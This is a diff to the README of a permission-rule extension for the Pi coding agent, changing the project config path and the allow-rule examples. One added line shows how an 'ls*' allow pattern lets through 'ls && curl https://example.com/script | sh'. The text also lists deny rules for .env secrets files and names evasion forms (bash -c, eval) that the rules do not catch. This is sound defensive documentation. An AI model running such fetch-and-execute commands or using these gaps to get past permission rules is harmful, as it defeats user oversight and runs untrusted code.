@@ -37,6 +37,10 @@ Three rule dimensions plus one boundary check:
 
 This is a guardrail against **agent mistakes**, not a security boundary.
 
+> Would a well-meaning agent produce this shape while doing a normal task? If
+> yes, it belongs. If the only reason to write it is to defeat a rule, it does
+> not.
+
 It matches what a cooperative agent writes: plain commands, compound
 commands, writes outside the working tree. It makes no attempt to catch
 forms whose only purpose is to get past a rule: `bash -c '...'`, `eval`,
@@ -59,7 +63,12 @@ JSON, one file per scope:
 | Scope | Path |
 |---|---|
 | Global | `<agent dir>/extensions/pi-kit-permissions.json` — normally `~/.pi/agent/extensions/pi-kit-permissions.json`; honours `PI_CODING_AGENT_DIR` |
-| Project | `<cwd>/.pi/pi-kit-permissions.json` — loaded **only when the project is trusted** |
+| Project | `<cwd>/.pi/extensions/pi-kit-permissions.json` — loaded **only when the project is trusted** |
+
+The project file lives under `extensions` so its presence triggers Pi's
+project-trust check even when no other project resources exist. The old flat
+path `<cwd>/.pi/pi-kit-permissions.json` is ignored; move that file into
+`extensions` to use project configuration.
 
 Every key is optional. Omitted keys take their default.
 
@@ -175,14 +184,19 @@ A bash redirection into a secrets file:
 { "bash": { "deny": ["* > .env*", "* >> .env*"] } }
 ```
 
-A locked-down project (`ask` for everything not explicitly allowed):
+Ask by default, allowing only these exact command strings (inherited rules
+still apply):
 
 ```json
 {
   "defaultMode": "ask",
-  "bash": { "allow": ["ls*", "cat *", "git status*", "git diff*", "git log*", "pnpm test*"] }
+  "bash": { "allow": ["ls", "git status", "git diff", "git log", "pnpm test"] }
 }
 ```
+
+List specific complete commands to allow flags or arguments. A trailing `*`
+in an allow pattern also matches chained commands: `ls*` allows
+`ls && curl https://example.com/script | sh` unless a deny or ask rule matches.
 
 ## Supported versions
 
